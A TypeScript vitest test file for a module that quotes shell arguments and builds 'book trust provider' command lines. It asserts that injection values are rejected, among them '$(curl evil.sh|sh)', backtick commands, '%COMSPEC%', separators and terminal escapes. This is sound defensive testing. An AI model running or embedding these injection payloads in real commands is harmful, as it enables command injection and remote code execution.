import { describe, expect, it } from 'vitest';
import {
  providerTrustCommand,
  shellArgument,
  trustCommandLine,
  trustCommandText,
} from './trust-command.js';

describe('shellArgument', () => {
  it('leaves a safe word bare, and double-quotes one with spaces', () => {
    expect(shellArgument('evil')).toBe('evil');
    expect(shellArgument('/work/my repo')).toBe('"/work/my repo"');
  });

  it('gives no quoting to a value neither a POSIX shell nor cmd.exe can quote verbatim', () => {
    for (const hostile of [
      '$(curl evil.sh|sh)',
      'a"b',
      'a`b`',
      'a\nb',
      'a b\\',
      'a b!',
      'a\u001b[2Jb',
      'a\u009bb',
    ]) {
      expect(shellArgument(hostile)).toBeNull();
    }
  });
});

describe('trustCommandLine', () => {
  it('adds --workspace unless the workspace is the current directory', () => {
    expect(trustCommandLine(process.cwd(), 'provider x')).toBe('book trust provider x');
    expect(trustCommandLine('/work/repo', 'provider x')).toBe(
      'book trust provider x --workspace /work/repo',
    );
    expect(trustCommandLine('/work/my repo', 'provider x')).toBe(
      'book trust provider x --workspace "/work/my repo"',
    );
  });

  it('returns null for a workspace path that cannot be quoted', () => {
    expect(trustCommandLine('/work/$HOME', 'provider x')).toBeNull();
  });
});

describe('trustCommandText', () => {
  it('falls back to a note naming the directory when the path defeats quoting', () => {
    expect(trustCommandText('/work/$HOME', 'provider x')).toEqual({
      command: 'book trust provider x',
      note: ' (run it from /work/$HOME)',
    });
  });
});

describe('providerTrustCommand', () => {
  const workspace = '/work/repo';

  it('quotes an id with spaces and names the workspace', () => {
    expect(providerTrustCommand(workspace, 'my provider')).toEqual({
      command: 'book trust provider "my provider" --workspace /work/repo',
      note: '',
    });
  });

  it('leaves a plain id bare', () => {
    expect(providerTrustCommand(workspace, 'teamsrv').command).toBe(
      'book trust provider teamsrv --workspace /work/repo',
    );
  });

  it.each([
    'x $(curl evil.sh|sh)',
    'x `id`',
    'say "hi"',
    'a\nb',
    '--all-pending',
    '-x',
    'ends-with-backslash\\',
    'e\u001b[2Jvil',
    '%COMSPEC%',
    'wait!',
    'a;b',
    'a&b',
    'étoile',
  ])('never puts %j on the command line: it lists instead', (id) => {
    const { command } = providerTrustCommand(workspace, id);
    expect(command).toBe('book trust provider --workspace /work/repo');
  });

  it('is the listing command when no id is given', () => {
    expect(providerTrustCommand(workspace).command).toBe(
      'book trust provider --workspace /work/repo',
    );
  });

  it('omits --workspace for the current directory', () => {
    expect(providerTrustCommand(process.cwd(), 'teamsrv').command).toBe(
      'book trust provider teamsrv',
    );
  });
});
